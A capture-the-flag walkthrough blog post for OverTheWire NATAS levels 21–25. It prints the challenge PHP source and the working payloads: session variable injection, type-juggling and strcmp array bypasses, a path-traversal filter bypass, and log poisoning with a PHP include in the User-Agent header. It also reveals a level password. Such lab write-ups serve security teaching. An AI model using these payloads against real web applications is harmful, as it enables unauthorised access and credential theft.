---
title: 'OverTheWire: NATAS 21 &#8211; 25'
date: 2019-09-16T14:49:55-04:00
categories: [Walkthrough, OverTheWire]
tags: [web]
---
### LEVEL 21

<img class="alignnone size-full wp-image-269" src="/assets/img/2019/09/2019-09-19_09h49_33.png" /> 

This level has a second site associated with it, where all the action is:

<img class="alignnone size-full wp-image-270" src="/assets/img/2019/09/2019-09-19_09h50_09.png" /> 

#### Main Site

PHP sourcecode of the main page:

{% highlight php %}
<?

function print_credentials() { 
  if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
  print "You are an admin. The credentials for the next level are:<br>";
  print "<pre>Username: natas22\n";
  print "Password: <censored></pre>";
  } else {
  print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
  }
}

session_start();
print_credentials();

?>
{% endhighlight %}

The main site needs &#8220;admin&#8221; session variable set to 1 for us to get the next password.

#### Experimenter Site

The PHP sourcecode of the experimenter page:

{% highlight php %}
<? 
session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
  foreach($_REQUEST as $key => $val) {
  $_SESSION[$key] = $val;
  }
}

if(array_key_exists("debug", $_GET)) {
  print "[DEBUG] Session contents:<br>";
  print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
  $val = $defval;
  if(array_key_exists($key, $_SESSION)) {
  $val = $_SESSION[$key];
  } else {
  $_SESSION[$key] = $val;
  }
  $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";
?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?>
{% endhighlight %}

The first thing I noticed on the experimenter site is the use of &#8220;DEBUG&#8221; variable again, so I immediately set it for future use. When looking at the requests in Burp, I noticed the request for the main site and the experimenter site have different PHPSESSION cookie values, so that may be a problem when we&#8217;re trying to set &#8220;admin=1&#8221; for the main site.

There&#8217;s a line in the source that sets some HTML with values we have control over, so maybe we can inject HTML.  
`$form .= “$key: <input name=’$key’ value=’$val’ />”;`

Tested an injection of `‘ />admin:<input name=’admin’ value=’1` on the &#8220;bgcolor&#8221; value. Success with the injection!  
<img class="alignnone size-full wp-image-272" src="/assets/img/2019/09/2019-09-19_10h11_15.png" /> 

To use the debug flag while we submit the form, put it all in the address bar like `“/index.php?debug&align=center&fontsize=100%25&bgcolor=yellow%27%20/%3E%3Cbr%3Eadmin:%3Cinput%20name=%27admin%27%20value=%271&submit=Update”`  
<img class="alignnone size-full wp-image-273" src="/assets/img/2019/09/2019-09-19_10h20_28.png" /> 

Looking at the page source for this is pretty revealing:

{% highlight html %}
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
[DEBUG] Session contents:<br>Array
(
  [align] => center
  [fontsize] => 100%
  [bgcolor] => yellow' /><br>admin:<input name='admin' value='1
  [debug] => 
  [submit] => Update
)

<p>Example:</p>
<div style='background-color: yellow' /><br>admin:<input name='admin' value='1; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br>admin:<input name='admin' value='1' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
{% endhighlight %}

From looking at the debug output, it looks like can modify our injection to get placed into the session array instead of the HTML. It&#8217;s a little easier to do within Burp Repeater than it would be in the browser:

<img class="alignnone wp-image-274 size-full" src="/assets/img/2019/09/2019-09-19_10h27_28.png" />  
Success! Notice how `"[admin] => 1"` is injected into the session array.

All we should have to do is then change the PHPSESSID of the main site to this one and reload. Just load the main site request into Repeater and change the PHPSESSID value, then Send&#8230; BUT IT DOESN&#8217;T WORK!!

Maybe we _DO_ have to inject the value first into the HTML to set it into the Session Array.  
Since we have to interact with the &#8216;Update&#8217; button on the page, use the browser for this part. Use the HTML injection from earlier for the &#8220;bgcolor&#8221; value, `yellow’ />admin:<input name=’admin’ value=’1`, then press the &#8216;Update&#8217; button. When you get the response, the HTML should be changed to include our admin value. Then press &#8216;Update&#8217; once more to add the values into the Session Array.

Check that it worked by using the Burp Repeater again on the main site, don&#8217;t forget to change the PHPSESSID value to the experimenter site!

<img class="alignnone wp-image-275 size-full" src="/assets/img/2019/09/2019-09-19_10h53_28.png" /> 

AWESOME! It worked!

&nbsp;

### LEVEL 22

This level is almost completely blank on the HTML, only a link to the sourcecode! Let&#8217;s see it&#8230;

{% highlight php %}
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
  // only admins can reveal the password
  if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
  header("Location: /");
  }
}
?>


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?
  if(array_key_exists("revelio", $_GET)) {
  print "You are an admin. The credentials for the next level are:<br>";
  print "<pre>Username: natas23\n";
  print "Password: <censored></pre>";
  }
?>
{% endhighlight %}

This time it is checking for a variable `'revelio'`. And that&#8217;s ALL it&#8217;s checking for!! This level must be a Harry Potter joke.

Sure enough, that&#8217;s all it needed!  
<img class="alignnone wp-image-280 size-full" src="/assets/img/2019/09/2019-09-19_11h40_39.png" /> 

Doing this from the browser doesn&#8217;t get the same results though, because there&#8217;s a redirect, &#8220;Location: /&#8221;.

&nbsp;

### LEVEL 23

<img class="alignnone size-full wp-image-281" src="/assets/img/2019/09/2019-09-19_11h46_04.png" /> 

Here we only have a password entry form.

{% highlight php %}
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
  if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
      echo "<br>The credentials for the next level are:<br>";
      echo "<pre>Username: natas24 Password: <censored></pre>";
    }
    else{
      echo "<br>Wrong!<br>";
    }
  }
  // morla / 10111
?>
{% endhighlight %}

Looks like the function strstr() is being used to search a variable &#8216;passwd&#8217; for the phrase &#8220;iloveyou&#8221;. The only other check is that &#8216;passwd&#8217; equals a number greater than 10. So there is a check for a number, and a check for a string. It appears that putting a mathematical operator in the second check must force it to treat the string as a number, dropping off the invalid non-numerical characters. Because &#8220;11iloveyou&#8221; works!!

<img class="alignnone size-full wp-image-282" src="/assets/img/2019/09/2019-09-19_11h57_55.png" /> 

&nbsp;

### LEVEL 24

This is another password input form just like the last level. Here is the sourcecode for this one:

{% highlight php %}
<?php
  if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
      echo "<br>The credentials for the next level are:<br>";
      echo "<pre>Username: natas25 Password: <censored></pre>";
    }
    else{
      echo "<br>Wrong!<br>";
    }
  }
  // morla / 10111
?>
{% endhighlight %}

This password check is using strcmp() this time. Go straight to the [manual page](https://www.php.net/manual/en/function.strcmp.php) to see if there&#8217;s anything interesting about it. The first thing that catches my eye is the return values.

>“Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.  ”

This is used in a boolean check, so &#8220;0&#8221; means False. There is a NOT operator on the strcmp(), so that would mean a &#8220;0&#8221; result means True now. The way to get the intended result is if the strings are equal. We&#8217;re probably not going to just guess the password, so maybe there is something else we can exploit in the return values.

One of the comments on the manual page is interesting:

> `<span class="html">strcmp() will return NULL on failure.</span>`
> 
> This has the side effect of equating to a match when using an equals comparison (==).  
> Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.
> 
> &#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;  
> Example  
> &#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;
> 
> $variable1 = array();  
> $ans === strcmp($variable1, $variable2);
> 
> This will stop $ans from returning a match;
> 
> Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.

Getting it to return NULL might give us a useful side effect. In the example in the comment, the variable is assigned an array to get a failure. So to force the &#8216;passwd&#8217; variable to an array, put in `/?passwd[]=something` for the query. That returns an error message and success!

<img class="alignnone size-full wp-image-284" src="/assets/img/2019/09/2019-09-19_12h29_45.png" /> 

&nbsp;

### LEVEL 25

This level starts out with a block of text that gets replaced when you change the language setting.

<img class="alignnone size-full wp-image-287" src="/assets/img/2019/09/2019-09-19_12h47_46.png" /> 

Sourcecode:

{% highlight php %}
<?php
  // cheers and <3 to malvina
  // - morla

  function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
      if(safeinclude("language/" . $_REQUEST["lang"] ))
        return 1;
    safeinclude("language/en"); 
  }
  
  function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
      logRequest("Directory traversal attempt! fixing request.");
      $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
      logRequest("Illegal file access detected! Aborting!");
      exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
      include($filename);
      return 1;
    }
    return 0;
  }
  
  function listFiles($path){
    $listoffiles=array();
    if ($handle = opendir($path))
      while (false !== ($file = readdir($handle)))
        if ($file != "." && $file != "..")
          $listoffiles[]=$file;
    
    closedir($handle);
    return $listoffiles;
  } 
  
  function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
  }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php 
  session_start();
  setLanguage();
  
  echo "<h2>$__GREETING</h2>";
  echo "<p align=\"justify\">$__MSG";
  echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
{% endhighlight %}

Looking at the source there are a couple of things that jump out at me. First is the homegrown checks on input for the language file. Those checks can probably be gotten around. Also there is a logfile getting written to that may be vulnerable to a stored XSS type of attack.

#### Objective 1

Try to get around the checks on the included language file.

I started out with getting one of the checks to fail, to see what would happen and to create the log file, using `/?lang=/../logs/natas25_g2ouhkp80fj036rpalvnpb9l13.log` There was no obvious result on the response page, but maybe the log file was created.

Next I tried `/?lang=/…/./logs/natas25_g2ouhkp80fj036rpalvnpb9l13.log`. Important point being the &#8220;../&#8221; was removed from &#8220;/&#8230;/./&#8221;, leaving &#8220;/../&#8221; correctly in place.  
I get the expected log output as:

{% highlight plain_text %}
[19.09.2019 12::52:19] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 12::54:32] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
{% endhighlight %}

<img class="alignnone size-full wp-image-288" src="/assets/img/2019/09/2019-09-19_12h58_22.png" /> 

#### Objective 2

Get around the check for &#8220;natas_webpass&#8221;.

Stored XSS is likely possible on the log file using the User-Agent string, since that gets saved. Injecting some PHP that reads &#8220;natas_webpass&#8221; should bypass the check on our variable.

Write &#8220;User-Agent: <?php include(&#8220;/etc/natas_webpass/natas26&#8243;); ?>&#8221; into the HTTP header using Burp Repeater:

{% highlight plain_text%}
[19.09.2019 12::52:19] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 12::54:32] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 12::56:21] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 13::05:45] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
33 "Directory traversal attempt! fixing request."
{% endhighlight %}

Success!!

&nbsp;